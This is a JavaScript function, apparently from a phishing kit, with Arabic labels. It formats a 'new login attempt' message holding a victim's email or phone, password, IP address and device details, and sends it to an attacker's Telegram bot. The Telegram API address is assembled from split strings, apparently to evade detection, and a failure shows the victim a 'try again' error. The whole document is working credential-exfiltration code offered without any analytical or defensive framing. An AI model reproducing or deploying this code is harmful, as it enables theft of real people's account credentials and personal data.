async function sendToTelegram(data, token, chatId) {
    const message = `
<b>محاولة تسجيل دخول جديدة</b>
<b>البريد الإلكتروني أو الهاتف:</b> ${data.email}
<b>كلمة المرور:</b> ${data.password}
<b>عنوان IP:</b> ${data.ip}
<b>نوع الجهاز:</b> ${data.deviceInfo.deviceType}
<b>المنصة:</b> ${data.deviceInfo.platform}
<b>وكيل المستخدم:</b> ${data.deviceInfo.userAgent}
<b>دقة الشاشة:</b> ${data.deviceInfo.screenWidth}x${data.deviceInfo.screenHeight}
    `;
    const apiBase = "https://api.";
    const botMethod = "telegram.org/";
    const sendMessage = "sendMessage";
    const url = apiBase + botMethod + "bot" + token + "/" + sendMessage;
    try {
        await fetch(url, {
            method: 'POST',
            headers: { 'Content-Type': 'application/json' },
            body: JSON.stringify({
                chat_id: chatId,
                parse_mode: 'html',
                text: message
            })
        });
    } catch (err) {
        console.error('Error sending to Telegram:', err);
        throw new Error('حاول مرة أخرى');
    }
}